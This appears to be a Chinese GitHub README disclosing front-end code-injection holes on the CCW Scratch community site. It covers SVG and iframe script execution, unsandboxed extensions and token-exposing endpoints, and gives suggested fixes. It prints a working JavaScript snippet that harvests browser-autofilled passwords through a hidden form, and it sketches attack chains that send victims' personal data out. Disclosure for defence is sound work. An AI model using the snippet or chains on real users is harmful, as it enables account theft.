# CCW-Code-Injection

记录共创世界的前端代码注入漏洞、可能的盗号方式和防护方式建议。

更新时间：北京时间 2026年6月1日 23:56

该仓库创建于北京时间 2026年2月10日 ，此前被修复的漏洞可能没有记录。  

> [!WARNING]  
> **仅供学习研究用途，请勿用于网络攻击，违者后果自负！！！**  
>
> **For learning and research purposes only. Do not use for cyber attacks. Offenders will bear all the consequences!!!**

> [!TIP]  
> ↓ 如图所示，点击右上角的这个按钮查看目录  
> <img src="img/octicon-list-unordered.png" height="32">   

> [!TIP]  
> 建议使用 [CCW-Code-Injection-Risk-Warning](https://github.com/bddjr/CCW-Code-Injection-Risk-Warning) 防御部分漏洞。  

---

## 自动填充账号密码

这本该是浏览器的问题。  
如果用户没有更改浏览器的相关设置，只要 `<input>` 元素没有填写错误的 autocomplete 属性，浏览器就会自动填充已保存的账号密码，没有经过使用者的许可。  

攻击者成功注入恶意代码之后，可以盗取浏览器自动填充的账号密码，即使网页未显示输入框。  

> 但是，为什么 CCW 的登录界面不会自动填充密码？  
> 那是因为 CCW 的登录界面的 password 输入框的 autocomplete 属性填的是 "new-password" 。  

参考 https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Attributes/autocomplete

网站可以采取的防护措施：  
如果CCW网站登录支持2FA，像Github和npm那样的2FA，并且2FA也防暴力破解，应该会大大增加盗号难度。  
只要用户设置了2FA，攻击者即使盗到密码也不能直接在攻击者自己的设备上登录，那么攻击者即使盗了密码也没用，攻击行为只能发生在用户未关闭网页的情况下，用户只要关闭网页，攻击者就没办法继续攻击了。  
这虽然防不了钓鱼的登陆界面，但至少可以防止在完全不知情的情况下被盗取浏览器自动填充的密码。

> [!TIP]  
> 建议禁用浏览器的自动填充密码，或者改为 “在查看或填写网站密码之前提示设备登录选项。始终征求许可”  
> 
> ![3](./img/3.png)  

盗号程序演示：

> [!WARNING]  
> **仅用于测试自己的环境的安全性，不得用于盗取他人账号，违者后果自负！！！**  
>
> **For testing the security of your own environment only. Do not use it to steal others' accounts. Offenders will bear all the consequences!!!**  

```js
// 在浏览器的控制台粘贴代码，然后按键盘上的 enter 。
// 返回类型 { id: string, password: string } 。
// 如果返回的 id 和 password 都是空字符串，说明浏览器没有自动填充密码。
await new Promise((resolve, reject) => {
    var form, timeoutId;
    function removeElement() {
        try { if (form) form.remove() } catch (e) { }
    }
    function clearMyTimeout() {
        try { if (timeoutId) clearTimeout(timeoutId) } catch (e) { }
    }
    try {
        form = document.createElement('form');
        form.style.display = 'none';
        form.innerHTML = (
            `<input type=text name=id autocomplete=username>` +
            `<input type=password name=password autocomplete=current-password>`
        );
        function res() {
            try {
                const out = Object.fromEntries(new FormData(form));
                removeElement();
                resolve(out);
            } catch (e) {
                removeElement();
                reject(e);
            }
        }
        function oninput() {
            if (form.lastChild.value && form.firstChild.value) {
                clearMyTimeout();
                res();
            }
        }
        form.firstChild.addEventListener('input', oninput)
        form.lastChild.addEventListener('input', oninput)
        document.body.appendChild(form);
        // 3 秒没填充就自动返回
        timeoutId = setTimeout(res, 3000);
    } catch (e) {
        removeElement();
        clearMyTimeout();
        reject(e);
    }
})
```

> [!NOTE]  
> 已知该漏洞被 “不想上学” 利用过。  
> 部分账号疑似被 “不想上学” 盗取，并被用于发布评论和恶意扩展，已知包括：
> 
> - [沙雕的初小白](https://www.ccw.site/student/6700b4333feba73009833eb5)  
>   共创世界 ID 265003222  
>   处罚：已被封禁，然后于2026年5月11日15时左右解除封禁，随后的 3 个小时内再次被封禁。  
>   封禁时间：2026年5月8日 14:55:59  
>   解封时间：2026年5月18日 17:10:52  
> 
> - [生气的Charles0](https://www.ccw.site/student/66b75da6aa7ba3081f3f839f)  
>   共创世界 ID 263014899  
>   处罚：已被封禁  
>   封禁时间：2026年5月5日 23:42:24  
>   解封时间：2029年1月28日 23:44:21
> 
> 以下证据截图自 [文章](https://learn.ccw.site/article/998d3e07-7210-4b5a-ab6d-64ac84e3caef) 的评论区和 “不想上学” 发的链接。  
> 
> ![6](img/6.png)  
> ![7](img/7.png)  
>
> 以下评论截图自 [鸭鸭院长](https://www.ccw.site/student/61039f14fffbe5461b880787) 的主页评论区。  
>
> ![8](img/8.png)  
> ![9](img/9.png)  

> [!NOTE]  
> 官方回复：  
>
> ![10](img/10.png)  

---

## SVG

### 基于 Scratch 编辑器编辑造型的代码注入攻击：  

状态：⚠️未修复  

参考 https://muffin.ink/blog/scratch-vulnerability-disclosure/  
漏洞演示 https://www.ccw.site/detail/69f73e772a7d36316189ef73  

### 基于 iframe + svg 的代码注入攻击：  

状态：⚠️未修复

⚡立即中招，几乎没有反应时间。  
如果在浏览器里直接用一个标签页打开 svg ，浏览器会执行 svg 里的 JS 脚本。同理，在没有保护措施的 iframe 里加载 svg 也会立即执行脚本。  
漏洞演示：https://m.ccw.site/user_projects_assets/a8039314e7b97ea48e176b34090b680e.svg  
已知登录 www.ccw.site 时的 Set-Cookie 响应头是这样的
```
Set-Cookie: token=XXXXXXXXXXXXXXXX60816ba55659e776ec2d3be9; Path=/; Domain=.ccw.site; Max-Age=2592000; Expires=Tue, 02 Jun 2026 12:57:16 GMT; HttpOnly
```
因此，在 m.ccw.site 加载的 svg 里执行的脚本可以携带有效的 token 请求 CCW 接口。  
设想的场景：  
黑客在 learn.ccw.site 使用 iframe 嵌入来自 m.ccw.site 的 svg ，然后这个 svg 里有恶意代码，并且会伪装，表面上看这好像就是个 iframe 在显示b站的视频，背后其实已经把浏览器自动填充的密码、手机号、实名认证的姓名、身份证前两位和后两位等信息打包并发送到黑客的服务器了。  

**这比加载 Gandi IDE 再执行恶意脚本还要快很多很多倍，受害者根本来不及反应。**  

![0](./img/0.png)

![1](./img/1.png)

![2](./img/2.png)

> [!TIP]  
> 建议根据按照以下步骤操作，禁止 m.ccw.site 运行 JavaScript ，以增强安全性：
>
>  - 如果您使用 Google Chrome 浏览器：  
>    访问 https://m.ccw.site ，然后点击网址左侧的按钮，然后点击“网站设置”，然后将“JavaScript”权限改为“阻止”。  
>
>  - 如果您使用 Microsoft Edge 浏览器：  
>    访问 https://m.ccw.site ，然后点击网址左侧的🔒按钮，然后点击“此网站的权限”，然后将“JavaScript”权限改为“阻止”。  
>
>  - 如果您使用 Mozilla Firefox 浏览器：  
>    详见 https://support.mozilla.org/zh-CN/kb/javascript-settings-for-interactive-web-pages  

如果 CCW 官方需要防止浏览器访问 m.ccw.site 的时候执行脚本，只需要添加以下响应头，阻止执行任何脚本：  
```
Content-Security-Policy: script-src 'none';
```

---

## CCWData

状态：✅已修复  

Gandi云数据扩展 (CCWData) 已于北京时间 2026年5月21日 16:50:39 修复前端代码注入漏洞。

参考js文件 [20260521.scratch3_ccw_data.9ff72c43.prettyprint.js](20260521.scratch3_ccw_data.9ff72c43.prettyprint.js)

[查看旧版逻辑](./ccwdata-before-20260521-165039.md)  

修复后，相关积木会直接调用新版的积木。相关代码如下  

```js
{
    key: "getValueInJSON",
    value: function(t) {
        this.doNotLogError = !0;
        var e = this.getValueInJSON_2(t);
        return this.doNotLogError = !1,
        e
    }
}
```

```js
{
    key: "setValueInJSON",
    value: function(t) {
        this.doNotLogError = !0;
        var e = this.setValueInJSON_2(t);
        return this.doNotLogError = !1,
        e
    }
}
```

---

## 未上架的扩展

未上架的扩展就是第三方的脚本，它并没有运行在沙盒环境里，因此漏洞是十分明显的。

关于它的加载方式，有两种情况。

### detail页面

以前会在加载作品的时候直接执行第三方的脚本，然后才在用户点击 “立即运行” 的时候询问是否运行。  
这样的漏洞是非常明显的，脚本没有经过用户同意，就已经执行。  

现在在加载扩展之前就会警告，只有用户点击 “继续运行” 才会运行扩展的脚本，降低了安全风险。  

### 其它页面

其它页面例如：
> creator  
> gandi  
> embed

这些页面在加载项目的时候会立即加载并执行扩展脚本，不会经过用户同意，因此漏洞仍然明显。

攻击者可以利用 creator 或 gandi 会立即加载作品的特性，在加载作品的时候执行第三方扩展脚本。  
用户只需要访问创作页的链接，就会将自己的账号暴露在风险之中。  

对应的，在创作者学院的文章里，可以插入 iframe ，而 iframe 能立即访问 creator 或 gandi ，形成了漏洞链，用户仅需点开文章，就会暴露在风险之中。  

当然了，创作页执行上述操作，并不需要使用第三方扩展，只需要使用 CCWData 的代码注入漏洞，配合 “当计时器 > -1” 的帽子，就可以在浏览器访问链接后立即执行任意代码。

（iframe + Gandi 加载太慢了，不如用 iframe + svg）

---

## 创作者学院的iframe

状态：⚠️未修复  

您可能已经注意到，上述的部分攻击形式可以借助创作者学院嵌入iframe，形成漏洞链，受害者在已登录的状态下，点击文章就会中招。  

这其中有两种形式：

- 基于 `www.ccw.site/gandi` 或 `www.ccw.site/creator`  
  这是比较常见的方式，缺点是需要等待加载编辑器完成才会执行恶意代码，给受害者几秒钟的反应时间。  

- 基于 m.ccw.site 加载 SVG  
  只要 SVG 加载成功，恶意代码就会立即执行，受害者几乎没有反应时间。  

创作者学院的前端编辑器并不能直接插入任意站点，例如尝试插入 `https://example.com` ，它会提示：暂时只支持bilibili和西瓜视频以及站内链接  

查找并分析js文件  
https://learn.ccw.site/_next/static/chunks/708-9a7dbfbb32eca7d3.js  
https://learn.ccw.site/_next/static/chunks/5191-e0df96b8928838d4.js  
https://learn.ccw.site/_next/static/chunks/app/(normal)/home/layout-a9cb46b1ff2d4762.js  

```js
var r, c, a = n(23891), i = "2023-07-20 10:30:00", s = "64b8c81969db2747de4502be", o = ["https://scratch.mit.edu", "https://youtube.com", "https://www.facebook.com", "https://www.twitch.tv", "https://twitter.com", "https://qa.cocrea.world", "https://www.ixigua.com", "https://ixigua.com", "https://bilibili.com", "https://player.bilibili.com", "https://www.bilibili.com", "https://www.ccw.site", "https://ccw.site", "https://learn.ccw.site", "https://learn-qa.xiguacity.cn"], u = function(t) {
    try {
        var e = new URL(t).origin;
        if (o.includes(e) || e.includes("ccw.site") || e.includes("xiguacity.cn"))
            return !0;
        return !1
    } catch (t) {
        return !1
    }
}
```

创作者学院前端支持插入的 URL origin ：  

```js
[
  // 境内不能直连的
  "https://scratch.mit.edu",
  "https://youtube.com", // 重定向到 www.youtube.com
  "https://www.facebook.com",
  "https://www.twitch.tv",
  "https://twitter.com", // 重定向到 x.com

  // 已无 DNS 解析
  "https://qa.cocrea.world",

  // 西瓜视频已改名为抖音精选，以下旧域名会重定向到 www.douyin.com/jingxuan
  // 目前为止没看到有人嵌入这个网站的视频
  "https://www.ixigua.com",
  "https://ixigua.com",

  // bilibili
  "https://bilibili.com",
  "https://player.bilibili.com",
  "https://www.bilibili.com",

  // CCW
  "https://www.ccw.site",
  "https://ccw.site",
  "https://learn.ccw.site",
  "https://learn-qa.xiguacity.cn" // 已无 DNS 解析
]
```

或者 origin 包含 "ccw.site" 或 "xiguacity.cn" 。  

仅在编辑器里插入的时候会校验，但查看文章的时候加载iframe前不会校验。  
我不知道服务器会不会校验。  

幸运的是，在创作者学院发布这种含有恶意 iframe 的文章，如果造成了恐慌，文章可能会在一天之内被下架。  

---

## list_sessions接口

状态：✅已修复  

```
POST https://community-web.ccw.site/students/list_sessions?page=1&perPage=20&sortField=createdAt&sortType=DESC
```

这个接口的漏洞十分明显，攻击者只需要知道如何借助心跳接口获取 HmacMD5 的 key ，就可以搞定 A 请求头和 B 请求头，然后请求这个接口，获取当前用户的 token ，从而盗号。  
配合代码注入漏洞，形成漏洞攻击链。

CSense（自称“安全审计工具”的外挂脚本）的作者 [熊谷·凌(FurryR)](https://github.com/FurryR) 曾多次强调 CSense 无法盗取用户的密码，却隐瞒了这一事实。  
早期 CSense 利用该漏洞，将 CSense 使用者的登录信息和 token 发送给 CSense 的作者。

该漏洞在 2026 年 1 月 16 日 被修复，攻击者不能再借助该接口获取 token ，但仍可以获取登录时的时间、IP地址、浏览器版本，问题不大。

> [!NOTE]  
> 如图所示。  
> 这个漏洞已经存在很长时间，如果我不这么催，官方会修吗？  
> 官方是有多心虚才会跑来我的评论区删我的评论？  
> 搞得好像只要忽悠用户就能解决问题似的。  
>
> ![5](img/5.png)  
> 
> ![4](img/4.png)  

---

## login接口

状态：⚠️未修复  

```
POST https://sso.ccw.site/web/auth/login-by-password
```

该接口会在用户登录时响应的 json 里暴露当前的 token ，但它不会被存储到本地。  

攻击者只能在用户登录的时候获取它，而且只能获取当前会话的 token 。  

但既然用户都在这时候登录了，当然可以直接获取用户输入的密码，所以该漏洞的影响有限，仅对于不使用密码登录的人来说会增加风险。  

---

## 个人信息接口

```
POST https://community-web.ccw.site/students/self/detail
```

用户在已登录的状态下，每次访问 www.ccw.site 都会请求这个接口。  

攻击者成功注入恶意代码之后，请求该接口可以获取敏感信息，包括但不限于：
- 该账号绑定的手机号
- 该账号绑定 QQ 时的 QQ 昵称
- 该账号实名认证的全名
- 该账号实名认证的身份证的前两位和后两位

---

## 创作者学院的localStorage

创作者学院的文章不能在不借助 iframe 的情况下注入恶意代码，而且 iframe 引用的网址必须跨域，例如跨域到 www.ccw.site 或 m.ccw.site 。

iframe 在跨域的时候可能不能获取 `window.parent` 对象，所以暂不清楚该特性能否被攻击者利用。

创作者学院会在 `localStorage['persist:root']` 里保存最近查看文章时使用的账号的敏感信息，包括但不限于：
- 该账号绑定的手机号
- 该账号绑定 QQ 时的 QQ 昵称
- 该账号实名认证的全名
- 该账号实名认证的身份证的前两位和后两位

即使用户已经退出登录，这里也会继续保存这些内容。

---

## 素材集市的扩展恶意打分评论

状态：✅已修复

该漏洞不能用于注入恶意脚本，因此不能用于盗号。  

[素材集市](https://assets.ccw.site/)的扩展打分评论渲染器要求评论的第一行必须以 `-评分:` 开头。

正常的扩展打分评论是这样的：

```
-评分: 5
-标签: 安全
打个分
```

如果缺少 `-评分:` ，会导致渲染器抛出错误，整个页面白屏，中间显示一行黑色的文字：  

```
Application error: a client-side exception has occurred (see the browser console for more information).
```

攻击者可以请求接口，在“扩展打分”发送缺少评分的恶意评论，例如：

```
-没有评分
-没有标签
我“不小心”把你扩展炸了
```

即使账号已封禁，该打分评论仍未删除，仍会导致页面无法正常显示。  

受影响的页面例如 https://assets.ccw.site/extension/csb3.2

> [!TIP]  
> 建议使用 [CCW-assets-anti-evil-review-comment](https://github.com/bddjr/CCW-assets-anti-evil-review-comment) 解决该问题。

---

## BBcode代码注入漏洞

状态：✅已修复

参考 [BBcode教程](https://learn.ccw.site/post/7d129e01-e30a-4d88-92d2-320b555ed0f5) 的评论区。

---

## 官方的承诺

### 节选自《[重要通告]保护账号安全，做对这几件事...》  

> [!NOTE]  
> 该文章发表时，list_sessions 接口盗 token 的漏洞未修复。  
> 鸭鸭院长（CCW官方）试图忽悠用户，掩盖问题。  

对此，许多肝酱担忧是否因账号被盗导致了信息泄露？结合前文所示，盗号者没有任何渠道能够获取肝酱们的安全信息。

### 节选自《CCW共创世界隐私政策》  

> [!NOTE]  
> 这话 CCW 官方自己信吗？  

版本更新日期：2021年06月01日  
本政策生效日期：2021年06月01日  

**五.我们如何存储和保护您的个人信息**  
（二）个人信息的保护  
1. 平台会采取合理可行的措施，尽力避免收集无关的个人信息。平台只会在达成本政策所述目的所需的期限内保留您的个人信息，除非法律有强制的存留要求。在您的个人信息超出保留期间后，平台会根据适用法律的要求删除您的个人信息，或使其匿名化处理。

2. 我们已通过了公安部信息安全等级保护三级认证，并与监管机构、第三方测评机构建立了良好的协调沟通机制，及时抵御并处置各类信息安全威胁，为您的信息安全提供全方位保障。

3. 平台已制定个人信息安全事件应急预案，定期组织内部相关人员进行应急响应培训和应急演练，使其掌握岗位职责和应急处置策略和规程。

4. 如发生个人信息安全事件后，平台将按照法律法规的要求并最迟不迟于 30 个自然日内向您告知：安全事件的基本情况和可能的影响、平台已采取或将要采取的处置措施、您可自主防范和降低风险的建议、对您的补救措施等。事件相关情况平台将以邮件、信函、电话、推送通知等方式告知您，难以逐一告知个人信息主体时，平台会采取合理、有效的方式发布公告。同时，平台还将按照监管部门要求，上报个人信息安全事件的处置情况。

5. **由于技术的限制以及可能存在的各种恶意手段，在互联网行业，即便竭尽所能加强安全措施，也不可能始终保证信息百分之百的安全，我们将尽力确保您提供给我们的个人信息的安全性。请您知悉并理解，您接入我们的服务所用的系统和通讯网络，有可能因我们可控范围外的因素而出现问题。因此，我们强烈建议您采取积极措施保护个人信息的安全，包括但不限于使用复杂密码、定期修改密码、不将自己的账号密码等个人信息透露给他人。**

---

## 相关文章

- [CCW 社区安全 Q&A](https://learn.ccw.site/article/51501436-87d5-4d4b-976e-2d00bbc50e9a)  
  [Chen-Jin](https://www.ccw.site/student/692538ef86bbc77f84e3b259) 2026-05-10 02:45  

- [不想上学 | Ccw逆天入 Wiki | Fandom](https://ccw-amazing-animals.fandom.com/zh/wiki/%E4%B8%8D%E6%83%B3%E4%B8%8A%E5%AD%A6)  

- [不想上学的所作所为](https://learn.ccw.site/article/957a30f1-3dfb-4037-a994-4c8499708511)  
  [纆默黑狗斯特-mmhgst](https://www.ccw.site/student/60cd5619fa5edd0db169e2b8) 2026-05-08 19:07  

- [为什么你的密码会被恶意扩展窃取？](https://learn.ccw.site/article/87737a20-a45d-4d41-b950-1af19dbc1ae7)  
  [往昔余庆](https://www.ccw.site/student/5db279a4483f207ab58b3929) 2026-05-08 02:28  

- [软弱无能的共创世界](https://learn.ccw.site/article/31b8737c-f6be-406b-9c9f-becf3fd3004a)  
  [纆默黑狗斯特-mmhgst](https://www.ccw.site/student/60cd5619fa5edd0db169e2b8) 2026-05-06 23:41  

- [如何屏蔽 CCW 里的无关网站以增加安全性？](https://learn.ccw.site/article/effd5854-9ae9-4483-8927-efaa4a9a7d79)  
  [往昔余庆](https://www.ccw.site/student/5db279a4483f207ab58b3929) 2026-05-05 21:03  

- [不是。你手机号停运了我咋盗你号啊。](https://learn.ccw.site/article/692893c5-8525-4744-bb4d-a782cb5505be)  
  [纆默黑狗斯特-mmhgst](https://www.ccw.site/student/60cd5619fa5edd0db169e2b8) 2026-05-05 19:15  

- [Every version of Scratch is vulnerable to arbitrary code execution](https://muffin.ink/blog/scratch-vulnerability-disclosure/)  
  [muffin.ink](https://muffin.ink) 2026-04-23  

- [【社区公告】关于“账号安全”的通知](https://learn.ccw.site/article/998d3e07-7210-4b5a-ab6d-64ac84e3caef)  
  [共创世界产品汪](https://www.ccw.site/student/6008f86de6894d53dd63749f) 2026-04-13 19:20  

- [恶意扩展如何让你上钩？远远不止这些……](https://learn.ccw.site/article/5f06747c-fae9-4ed6-b69e-24016eedbfd3)  
  [浅_酱_](https://www.ccw.site/student/63d8837e6bc82a13fb855f0a) 2026-04-11 22:21  

- [Gandi内置的扩展有潜在使用eval函数执行任意js脚本的风险](https://learn.ccw.site/article/7d25e249-458a-4016-956f-d49cb315ca54)  
  [无心小白僵尸](https://www.ccw.site/student/66366121a7113d4ff035cd9c) 2026-02-23 12:33  

- [[重要通告]保护账号安全，做对这几件事...](https://learn.ccw.site/article/6af308a5-cb78-465c-bb1e-572c48f0fc5e)  
  [鸭鸭院长](https://www.ccw.site/student/61039f14fffbe5461b880787) 2025-12-08 17:09  

- [BBcode教程](https://learn.ccw.site/post/7d129e01-e30a-4d88-92d2-320b555ed0f5)  
  [白猫](https://www.ccw.site/student/6173f57f48cf8f4796fc860e) 2023-07-18
